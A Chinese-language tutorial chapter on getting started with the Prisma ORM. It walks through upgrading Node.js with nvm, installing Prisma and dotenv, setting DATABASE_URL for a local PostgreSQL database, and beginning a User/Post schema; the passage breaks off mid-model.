itemtype="http://schema.org/Article" data-entry-id="7592119218025250851" data-draft-id="7591878211086598179" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="第7章 Prisma入门"/> <meta itemprop="keywords" content="后端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-06T06:56:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XiaoYu2002"/> <meta itemprop="url" content="https://juejin.cn/user/251124329220663"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            第7章 Prisma入门
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/251124329220663/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XiaoYu2002
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:56:50.000Z" title="Tue Jan 06 2026 06:56:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读32分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;color:rgba(46,36,36,.87);overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{margin-bottom:5px;font-size:30px;font-weight:500}.markdown-body h1:before{content:"#";margin-right:10px;color:#1976d2}.markdown-body h2{font-size:28px;font-weight:400;border-left:5px solid #454545;margin-top:20px;padding-left:10px;transition:all .3s ease-in-out}.markdown-body h2:hover{border-color:#1976d2}.markdown-body h3{font-size:24px;font-weight:400;margin-top:15px;padding-bottom:0}.markdown-body h4{font-size:20px;font-weight:500}.markdown-body h5{font-size:16px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h2:first-letter,.markdown-body h3:first-letter,.markdown-body p:first-letter{text-transform:capitalize}.markdown-body em{text-emphasis:dot;text-emphasis-position:under}.markdown-body img{display:block;margin:0 auto!important;max-width:100%;border-radius:2px;box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)!important}.markdown-body hr{position:relative;width:98%;height:1px;border:none;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,#ddd,#999,#ddd);overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background:#fff;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center}.markdown-body code{font-weight:900;word-break:break-word;border-radius:2px;overflow-x:auto;font-size:.87em;padding:.065em .4em;background-color:#fbe5e1;color:#c0341d}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:0 4px}.markdown-body pre&gt;code{font-weight:400;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{margin:0 4px;text-decoration:none;color:#027fff;transition:all .3s ease-in-out;padding-bottom:4px;border-bottom:2px solid transparent}.markdown-body a:after{content:"";display:inline-block;width:18px;height:18px;margin-left:4px;vertical-align:middle;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiBzdHJva2U9IiMwMjdGRkYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCI+PHBhdGggZD0iTTkuODE1IDYuNDQ4bDEuOTM2LTEuOTM2YzEuMzM3LTEuMzM2IDMuNTgtMS4yNTkgNS4wMTMuMTczIDEuNDMyIDEuNDMyIDEuNTEgMy42NzYuMTczIDUuMDEzbC0xLjQ1MiAxLjQ1Mi0uOTY4Ljk2OGMtMS4zMzcgMS4zMzYtMy41ODEgMS4yNTktNS4wMTMtLjE3MyIvPjxwYXRoIGQ9Ik0xMS4yNjcgMTUuMzY3bC0xLjkzNiAxLjkzNmMtMS4zMzYgMS4zMzctMy41OCAxLjI2LTUuMDEyLS4xNzMtMS40MzItMS40MzItMS41MS0zLjY3Ni0uMTczLTUuMDEybDEuNDUyLTEuNDUyLjk2OC0uOTY4YzEuMzM2LTEuMzM3IDMuNTgtMS4yNiA1LjAxMi4xNzMiLz48L2c+PC9zdmc+);background-size:cover;background-repeat:no-repeat}.markdown-body a:hover{border-color:#027fff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body a.footnote-backref:after,.markdown-body a.footnote-ref:after,.markdown-body sup a:after{display:none!important}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border:2px solid #c6c6c6}.markdown-body table img{box-shadow:none!important}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body del{color:rgba(0,0,0,.6)}.markdown-body blockquote{position:relative;color:#666;padding:5px 23px 1px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:hsla(0,0%,78.4%,.12);transition:all .2s ease-in-out}.markdown-body blockquote:hover{border-color:#1976d2}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;font-size:24px;font-weight:800;line-height:24px;color:#cbcbcb;opacity:.6}.markdown-body blockquote:before{content:"“";top:4px;left:6px}.markdown-body blockquote:after{content:"”";right:8px;bottom:-8px}.markdown-body blockquote&gt;p,.markdown-body blockquote blockquote{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body details{outline:none;border:none;border-left:4px solid #1976d2;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary:hover::-webkit-details-marker{color:#1976d2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">7.1 升级Node.js版本</h2>
<p>在学习Prisma之前，我们需要先将Node.js版本升级到24，24版本的Node.js是可以直接在终端运行ts后缀的文件（不需要编译）。</p>
<p>升级Node.js版本可以从Node.js官网重新下载：<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fzh-cn%2Fabout%2Fprevious-releases" target="_blank" title="https://nodejs.org/zh-cn/about/previous-releases" ref="nofollow noopener noreferrer">Node.js — Node.js 版本</a>，选择状态为Active LTS（保持活跃）的版本，如图7-1所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec6188c0a7804ac0ad0f0d18e2edcfbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=rI8%2FtP75HMFhZLGZG4tyS7uCr5k%3D" alt="image-20251214202954467" loading="lazy"/></p>
<p align="center">
 <b> 图7-1 Node.js官网安装</b>
</p>
<p>但重新下载Node.js版本还是过于麻烦，因此我推荐大家通过nvm来管理Node.js的版本，Win+R打开运行窗口输入cmd进入终端，通过以下命令升级。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 确认nvm有正确安装</span>
nvm --version
<span class="hljs-comment">// 安装最新版本的Node.js</span>
nvm install <span class="hljs-number">24.12</span><span class="hljs-number">.0</span>
</code></pre>
<p>Node.js的最新版本号从Node.js官网获取，点击如图7-1所示Status为Active LTS的Details，会跳出保持活跃的Node.js大版本细分，如图7-2所示。看到最新版本的v24.12.0（实际最新以你打开时为准），使用nvm install &lt;Node.js版本&gt;下载。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7293fcdd69aa4629b9282ffca41ba79a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=t%2B2UISQ7y8bsLV2lANZ1Xciy4Z8%3D" alt="image-20251214203744512" loading="lazy"/></p>
<p align="center">
 <b> 图7-2 保持活跃的Node.js大版本细分</b>
</p>
<p>使用nvm下载Node.js 24.12.0之后，通过node --version可以看见Node.js版本并不是最新的。因为需要使用以下nvm命令将Node.js版本切到最新，然后重新node --version就可以看到目前的Node.js版本已经是24.12.0了，操作如图7-3所示。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 显示电脑目前存在的所有Node.js版本和目前使用的Node.js版本</span>
nvm list
<span class="hljs-comment">// 切换为最新的Node.js版本24.12.0</span>
nvm use <span class="hljs-number">24.12</span><span class="hljs-number">.0</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/891cb6db86d64817820fb79727c31020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=whkfnJfaUJeRwmybT19P2H7KtME%3D" alt="image-20251214203556993" loading="lazy"/></p>
<p align="center">
 <b> 图7-3 安装最新版本的Node.js</b>
</p>
<p>接着打开vscode或者cursor的插件商店，安装插件Prisma，如图7-4所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0285b45aa8b14cc6a30a53a546de6679~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=OQn6BbZr6g3%2BOaMMRfFEFVilNiM%3D" alt="image-20251214204556374" loading="lazy"/></p>
<p align="center">
 <b> 图7-4 Prisma插件安装</b>
</p>
<h2 data-id="heading-1">7.2 Prisma安装</h2>
<p>安装完成Node.js版本升级以及Prisma插件安装，开始正式学习Prisma。</p>
<p>首先什么是Prisma。正常情况下，我们的数据是存储在数据库里面，但如果我们需要操作数据库就需要编写SQL语句，而Prisma属于ORM框架的一种，ORM框架可以让我们通过面向对象的方式去操作数据库，也就是说通过编写JavaScript代码去自动生成SQL语句来操作数据库，我们就不需要去记忆这些SQL语句，还能防止SQL注入的风险。</p>
<p>现在我们重新启一个空项目（项目名：PRISMA）来安装学习Prisma。通过以下命令安装Prisma和客户端的包</p>
<pre><code class="hljs language-ts" lang="ts">npm i prisma
npm i <span class="hljs-meta">@prisma</span>/client
</code></pre>
<p>@prisma/client才是我们在代码里真正“用来操作数据库的库"，而prisma本身是一个“生成它的工具（CLI + Generator）”。简单的说prisma是“造ORM的工具”，@prisma/client是我们在用的ORM。</p>
<p>之所以要将@prisma/client单独拆成一个包，是为了解耦工具和运行时。CLI很大、更新频繁，而Client相对稳定，这两者不同频。这种思想理念，我们在学习Nest.js的业务合并就实践过，将业务数据格式层和业务数据层拆分开。</p>
<p>好的，通过以上概念，我们清楚了prisma这个第三方库其实是一个CLI工具，而CLI工具都有一系列配套命令的，就类似Nest CLI工具一样，总结如表7-1所示。</p>
<p align="center">
 <b> 表7-1 Prisma CLI工具命令总结</b>
</p>





















































<table><thead><tr><th>命令</th><th>用途</th></tr></thead><tbody><tr><td>prisma init</td><td>初始化项目 - 创建一个新的本地 Prisma Postgres 开发项目，生成 schema.prisma 等基础文件</td></tr><tr><td>prisma dev</td><td>启动开发服务器 - 启动一个本地的 Prisma Postgres 服务器用于开发</td></tr><tr><td>prisma generate</td><td>生成 Prisma Client - 根据 schema 生成类型安全的数据库客户端代码，每次修改 schema 后都需要运行</td></tr><tr><td>prisma studio</td><td>可视化数据库 - 打开一个 Web 界面，让你可以浏览和编辑数据库中的数据</td></tr><tr><td>prisma migrate dev</td><td>开发环境迁移 - 根据 schema 变更创建迁移文件，应用到数据库，并重新生成 Prisma Client（开发时最常用）</td></tr><tr><td>prisma db pull</td><td>拉取数据库结构 - 从现有数据库反向生成/更新 schema.prisma（适用于已有数据库的项目）</td></tr><tr><td>prisma db push</td><td>推送 schema 到数据库 - 直接将 schema 变更同步到数据库，不创建迁移文件（适合原型开发阶段）</td></tr><tr><td>prisma validate</td><td>验证 schema - 检查 schema.prisma 文件的语法和配置是否正确</td></tr><tr><td>prisma format</td><td>格式化 schema - 自动格式化 schema.prisma 文件，使其更易读</td></tr><tr><td>prisma version</td><td>显示版本 - 查看当前安装的 Prisma 版本信息</td></tr><tr><td>prisma debug</td><td>调试信息 - 显示 Prisma 的调试信息，排查问题时有用</td></tr></tbody></table>
<h2 data-id="heading-2">7.3 Prisma初始化</h2>
<p>那么接下来就通过这个Prisma CLI工具来初始化prisma项目。因为我们没有全局安装CLI，所以采用npx从当下这个项目中去找Prisma CLI的命令，后续的操作都是这样。</p>
<pre><code class="hljs language-ts" lang="ts">npx prisma init
</code></pre>
<p>项目会额外生成1个文件夹（内含1个文件）和3个文件：</p>
<p>（1）Prisma文件夹：存放 Prisma 的核心配置文件schema.prisma，用于定义数据模型、数据库连接和生成器。schema.prisma文件用代码定义数据库表结构、关系和连接方式。</p>
<p>（2）.env文件：存储环境变量，特别是 DATABASE_URL，用于安全配置数据库连接字符串而不暴露在代码中。</p>
<p>（3）.gitignore文件：告诉 Git 忽略哪些文件（如 .env、node_modules），防止敏感信息或无关依赖被提交到版本库。</p>
<p>（4）prisma.config.ts文件：prisma的配置文件。</p>
<p>首先我们打开prisma.config.ts配置文件，最上方有两行注释，对应解释如下。需要我们通过npm安装prisma和dotenv，此时prisma我们已经安装了，而dotenv还没有安装需要安装一下。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// This file was generated by Prisma and assumes you have installed the following:</span>
<span class="hljs-comment">// 这个文件是由Prisma生成的，假设你已经安装了以下软件</span>
<span class="hljs-comment">// npm install --save-dev prisma dotenv</span>
<span class="hljs-comment">// 通过npm安装prisma和dotenv</span>
</code></pre>
<p>通过以下命令安装dotenv。</p>
<pre><code class="hljs language-ts" lang="ts">npm install --save-dev dotenv
</code></pre>
<p>这个dotenv是用来读取环境变量的包，dot是英文里的点(.)的直译，整个名称.env就是指以点号开头的环境文件。安装dotenv之后，prisma.config.ts文件就可以通过env()去获取到环境变量。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// prisma.config.ts</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"dotenv/config"</span>;
<span class="hljs-keyword">import</span> { defineConfig, env } <span class="hljs-keyword">from</span> <span class="hljs-string">"prisma/config"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">schema</span>: <span class="hljs-string">"prisma/schema.prisma"</span>,
  <span class="hljs-attr">migrations</span>: {
    <span class="hljs-attr">path</span>: <span class="hljs-string">"prisma/migrations"</span>,
  },
  <span class="hljs-attr">datasource</span>: {
    <span class="hljs-attr">url</span>: <span class="hljs-title function_">env</span>(<span class="hljs-string">"DATABASE_URL"</span>),
  },
});

</code></pre>
<p>而环境变量在.env文件中，prisma.config.ts文件env()里的字符串"DATABASE_URL"会读取到.env文件中的环境变量。那么这个DATABASE_URL地址是做什么的？可以帮我们去连接数据库，默认生成的内容可以直接删除。</p>
<p>DATABASE_URL变量组成的三部分格式如图7-5所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8864f2689de64b1597672b2efebef356~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=LiIcSV7bHKegss0MC6WEgIsj7aw%3D" alt="image-20251214213555355" loading="lazy"/></p>
<p align="center">
 <b> 图7-5 DATABASE_URL变量组成的三部分格式</b>
</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// .env</span>
# <span class="hljs-title class_">Environment</span> variables declared <span class="hljs-keyword">in</span> <span class="hljs-variable language_">this</span> file are <span class="hljs-variable constant_">NOT</span> automatically loaded by <span class="hljs-title class_">Prisma</span>.
# <span class="hljs-title class_">Please</span> add <span class="hljs-string">`import "dotenv/config";`</span> to your <span class="hljs-string">`prisma.config.ts`</span> file, or use the <span class="hljs-title class_">Prisma</span> <span class="hljs-variable constant_">CLI</span> <span class="hljs-keyword">with</span> <span class="hljs-title class_">Bun</span>
# to load environment variables <span class="hljs-keyword">from</span> .<span class="hljs-property">env</span> <span class="hljs-attr">files</span>: <span class="hljs-attr">https</span>:<span class="hljs-comment">//pris.ly/prisma-config-env-vars.</span>

# <span class="hljs-title class_">Prisma</span> supports the native connection <span class="hljs-built_in">string</span> format <span class="hljs-keyword">for</span> <span class="hljs-title class_">PostgreSQL</span>, <span class="hljs-title class_">MySQL</span>, <span class="hljs-title class_">SQLite</span>, <span class="hljs-variable constant_">SQL</span> <span class="hljs-title class_">Server</span>, <span class="hljs-title class_">MongoDB</span> and <span class="hljs-title class_">CockroachDB</span>.
# <span class="hljs-title class_">See</span> the documentation <span class="hljs-keyword">for</span> all the connection <span class="hljs-built_in">string</span> <span class="hljs-attr">options</span>: <span class="hljs-attr">https</span>:<span class="hljs-comment">//pris.ly/d/connection-strings</span>

# <span class="hljs-title class_">The</span> following <span class="hljs-string">`prisma+postgres`</span> <span class="hljs-variable constant_">URL</span> is similar to the <span class="hljs-variable constant_">URL</span> produced by running a local <span class="hljs-title class_">Prisma</span> <span class="hljs-title class_">Postgres</span>
# server <span class="hljs-keyword">with</span> the <span class="hljs-string">`prisma dev`</span> <span class="hljs-variable constant_">CLI</span> command, when not choosing <span class="hljs-built_in">any</span> non-<span class="hljs-keyword">default</span> ports or settings. <span class="hljs-title class_">The</span> <span class="hljs-variable constant_">API</span> key, unlike the
# one found <span class="hljs-keyword">in</span> a remote <span class="hljs-title class_">Prisma</span> <span class="hljs-title class_">Postgres</span> <span class="hljs-variable constant_">URL</span>, does not contain <span class="hljs-built_in">any</span> sensitive information.

<span class="hljs-variable constant_">DATABASE_URL</span>=<span class="hljs-string">"prisma+postgres://localhost:51213/?api_key=省略"</span>
</code></pre>
<h2 data-id="heading-3">7.4 Prisma连接数据库</h2>
<p>打开Prisma官方文档，官方文档会教我们如何去连接数据库。</p>
<p>官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.prisma.io%2Fdocs%2Form%2Foverview%2Fdatabases%2Fpostgresql" target="_blank" title="https://www.prisma.io/docs/orm/overview/databases/postgresql" ref="nofollow noopener noreferrer">PostgreSQL database connector | Prisma Documentation</a>。</p>
<p>DATABASE_URL变量占位符表示路径结构如图7-6所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f49c7db5e19d480eb001ead390338a40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=yXcCxGf5LGhIf%2B7mRIQXWnxWq7o%3D" alt="image-20251214213731203" loading="lazy"/></p>
<p align="center">
 <b> 图7-6 DATABASE_URL变量占位符表示路径结构</b>
</p>
<p>可以看到DATABASE_URL的三部分组成分别是：</p>
<p>（1）需要连接的数据库名称：postgresql（或者mysql什么的）。</p>
<p>（2）数据库的登录信息。</p>
<p>（3）登录成功后，要连接的具体哪个数据库。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-attr">postgresql</span>:<span class="hljs-comment">//USER:PASSWORD@HOST:PORT/DATABASE</span>
</code></pre>
<p>在官方文档中，有一份英文的表格来说明这行的组成部分，我将它翻译成中文放在下方，如表7-2所示。</p>
<p align="center">
 <b> 表7-2 DATABASE_URL占位符含义</b>
</p>



































<table><thead><tr><th>名称</th><th>占位符</th><th>描述</th></tr></thead><tbody><tr><td>主机</td><td>HOST</td><td>数据库服务器的 IP 地址或域名，例如 localhost</td></tr><tr><td>端口</td><td>PORT</td><td>数据库服务器运行的端口，例如 5432</td></tr><tr><td>用户</td><td>USER</td><td>数据库用户名称，例如 janedoe</td></tr><tr><td>密码</td><td>PASSWORD</td><td>数据库用户的密码</td></tr><tr><td>数据库</td><td>DATABASE</td><td>要使用的数据库名称，例如 mydb</td></tr></tbody></table>
<p>对于我们而言，主机是localhost（本地），端口是postgresql默认的5432（如果是自定义的话，要去看下是多少），用户名是postgres，密码是123456，具体数据库还没建（提前想个数据库名test，等下建）。</p>
<p>因此DATABASE_URL是："postgresql://postgres:123456@localhost:5432/test"。将我们这份数据库地址拿到.env文件中使用。</p>
<p>通过编辑器插件找到DATABASE，新建数据库test。如图7-7所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3899bebd0fd4f0fb8964ad8f1b401ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=lMIXngxETu7YSka2VdkNGau%2Bcj0%3D" alt="image-20251214214657402" loading="lazy"/></p>
<p align="center">
 <b> 图7-7 新建数据库test</b>
</p>
<p>到目前位置，我们就配置好了环境变量DATABASE_URL，接着就可以到prisma文件中的schema.prisma文件中去具体编写代码对数据库的操作了。</p>
<p>接下来我们要通过编写JavaScript代码，通过Primsa这个ORM框架转成SQL语句之后，对postgres数据库进行操作修改。我们有如下需求：</p>
<p>（1）在test数据库中创建User表，内部存在一定的字段。</p>
<p>（2）在test数据库中创建Post表，内部存在一定的字段。</p>
<p>用户表用于存放用户信息，而用户可以编写很多文章，所以有一个对应的文章表用于存放文章的一些信息，并将文章表和用户表关联起来。在这份 Prisma schema 中，用户表（User）与文章表（Post）之间建立的是“一对多”的关系：一个用户可以拥有多篇文章，而每一篇文章只属于一个用户。Prisma 通过<strong>外键字段 + 关系指令</strong>，把这种业务关系同时落实到了数据库结构和 ORM 层的访问方式中。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// prisma/schema.prisma</span>

<span class="hljs-comment">// This is your Prisma schema file,</span>
<span class="hljs-comment">// learn more about it in the docs: https://pris.ly/d/prisma-schema</span>

<span class="hljs-comment">// Looking for ways to speed up your queries, or scale easily with your serverless or edge functions?</span>
<span class="hljs-comment">// Try Prisma Accelerate: https://pris.ly/cli/accelerate-init</span>

generator client {
  provider = <span class="hljs-string">"prisma-client"</span>
  output   = <span class="hljs-string">"../generated/prisma"</span>
}

datasource db {
  provider = <span class="hljs-string">"postgresql"</span>
}

<span class="hljs-comment">// 以下是编写的代码</span>
<span class="hljs-comment">// 用户表</span>
model <span class="hljs-title class_">User</span> {
  id        <span class="hljs-title class_">String</span>   <span class="hljs-meta">@id</span> <span class="hljs-meta">@default</span>(<span class="hljs-title function_">cuid</span>())
  email     <span class="hljs-title class_">String</span>   <span class="hljs-meta">@unique</span> 
  password  <span class="hljs-title class_">String</span>  
  posts     <span class="hljs-title class_">Post</span>[]
  createdAt <span class="hljs-title class_">DateTime</span> <span class="hljs-meta">@default</span>(<span class="hljs-title function_">now</span>())
  updatedAt <span class="hljs-title class_">DateTime</span> <span class="hljs-meta">@updatedAt</span>
}
<span class="hljs-comment">// 文章表</span>
model <span class="hljs-title class_">Post</span> {
